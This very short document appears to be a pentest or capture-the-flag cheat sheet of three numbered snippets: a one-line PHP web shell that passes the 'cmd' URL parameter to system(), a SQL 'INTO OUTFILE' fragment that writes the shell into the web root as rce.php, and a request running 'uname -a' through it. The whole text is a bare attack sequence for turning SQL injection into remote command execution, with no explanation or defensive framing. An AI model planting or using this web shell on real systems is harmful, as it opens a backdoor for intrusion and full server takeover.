# 1
```php
<?php echo(system($_GET["cmd"])); ?>
```
# 2
```sql
INTO OUTFILE '/var/www/html/rce.php'
```
# 3
```sql
rce.php?cmd=uname -a
```
